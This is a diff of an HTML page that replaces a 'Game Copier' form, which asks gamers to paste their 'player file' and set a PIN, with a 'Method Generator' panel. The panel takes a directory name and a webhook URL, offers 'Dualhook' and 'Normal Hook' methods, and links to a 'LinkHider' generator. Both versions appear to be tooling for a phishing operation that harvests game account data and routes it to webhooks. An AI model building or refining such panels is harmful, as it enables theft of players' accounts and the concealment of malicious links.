@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Game Copier</title>
+    <title>Method Generator</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
 
@@ -19,44 +19,27 @@
         }
 
         .title {
-            font-size: 48px;
+            font-size: 36px;
             font-weight: bold;
             color: #ff6b6b;
             margin-bottom: 20px;
         }
 
-        .container {
+        .form-container {
             display: flex;
-            width: 80%;
-            max-width: 1000px;
+            flex-direction: column;
+            width: 50%;
+            max-width: 600px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
             border-radius: 10px;
             overflow: hidden;
             background-color: #3b3f4a;
             animation: fadeIn 1s ease-in-out;
-            border: 2px solid #ff6b6b; /* Added border */
-        }
-
-        .left-section, .right-section {
-            flex: 1;
             padding: 30px;
+            border: 2px solid #ff6b6b;
         }
 
-        .left-section {
-            border-right: 1px solid #4a4f5a;
-        }
-
-        h1 {
-            color: #ff6b6b;
-            animation: slideIn 1s ease-in-out;
-        }
-
-        p {
-            margin: 10px 0 20px;
-            color: #b5b5b5;
-        }
-
-        input {
+        input, select, button {
             width: 100%;
             padding: 15px;
             margin: 10px 0;
@@ -67,18 +50,13 @@
             transition: border-color 0.3s;
         }
 
-        input:focus {
+        input:focus, select:focus {
             border-color: #ff6b6b;
             outline: none;
         }
 
         button {
-            width: 100%;
-            padding: 15px;
             background: linear-gradient(45deg, #ff6b6b, #f06595);
-            border: none;
-            border-radius: 5px;
-            color: #fff;
             cursor: pointer;
             transition: background 0.3s;
             font-size: 16px;
@@ -89,41 +67,43 @@
             background: linear-gradient(45deg, #f06595, #ff6b6b);
         }
 
-        .right-section {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .right-section h2 {
-            margin-bottom: 20px;
-            color: #ff6b6b;
-        }
-
-        .right-section .video-placeholder {
-            width: 100%;
-            height: 300px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #4a4f5a;
-            color: #aaa;
-            font-size: 18px;
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background: #333;
+            color: #fff;
             border-radius: 5px;
-            transition: background-color 0.3s;
-            border: 2px solid #ff6b6b; /* Added border */
-            overflow: hidden; /* Ensure the embedded video fits */
+            text-align: center;
+            z-index: 10;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
         }
 
-        .right-section .video-placeholder iframe {
-            width: 100%;
-            height: 100%;
+        .popup h2 {
+            margin: 0 0 10px;
+            font-size: 24px;
+        }
+
+        .popup p {
+            font-size: 16px;
+        }
+
+        .popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: #ff6b6b;
+            color: #fff;
             border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
         }
 
-        .right-section .video-placeholder:hover {
-            background-color: #5a5f6a;
+        .popup button:hover {
+            background: #f06595;
         }
 
         @keyframes fadeIn {
@@ -134,37 +114,65 @@
                 opacity: 1;
             }
         }
-
-        @keyframes slideIn {
-            from {
-                transform: translateY(-50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
     </style>
+    <script>
+        function showPopup(message) {
+            var popup = document.getElementById("popup");
+            var popupMessage = document.getElementById("popupMessage");
+            popupMessage.textContent = message;
+            popup.style.display = "block";
+        }
+
+        function hidePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+            var form = event.target;
+            var formData = new FormData(form);
+            var method = formData.get("method");
+
+            if (method === "dualhook") {
+                showPopup("Dualhook is under maintenance! Keep updated.");
+                return;
+            }
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.text())
+            .then(result => {
+                showPopup("Directory created successfully!");
+                console.log(result);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </head>
 <body>
-    <div class="title">Game Copier</div>
-    <div class="container">
-        <div class="left-section">
-            <h1>Game Copier</h1>
-            <p>Copy Games in a matter of seconds!</p>
-            <form action="/send" method="POST">
-                <input type="text" name="message" placeholder="Paste your player file here...">
-                <input type="password" name="pin" placeholder="Create a secure PIN">
-                <button type="submit">Copy Game!</button>
-            </form>
-        </div>
-        <div class="right-section">
-            <h2>Tutorial</h2>
-            <div class="video-placeholder">
-                YouTube Tutorial Coming Soon.
-            </div>
-        </div>
+    <div class="title">Method Generator</div>
+    <div class="form-container">
+        <form action="/add_webhook" method="POST" onsubmit="submitForm(event);">
+            <input type="text" name="directory_name" placeholder="Directory Name">
+            <input type="url" name="webhook_url" placeholder="Webhook URL">
+            <input type="text" name="name" placeholder="Name Here">
+            <input type="text" name="thumbnail" placeholder="Thumbnail Here">
+            <select name="method">
+                <option value="dualhook">Dualhook (VERY OP)</option>
+                <option value="normalhook">Normal Hook (OP)</option>
+            </select>
+            <button type="submit">Generate</button>
+            <button type="button" onclick="location.href='/hyperlink_generator'">Hyperlink (LinkHider) Generator</button>
+        </form>
+    </div>
+    <div id="popup" class="popup">
+        <h2>Notice</h2>
+        <p id="popupMessage"></p>
+        <button onclick="hidePopup()">Close</button>
     </div>
 </body>
 </html>
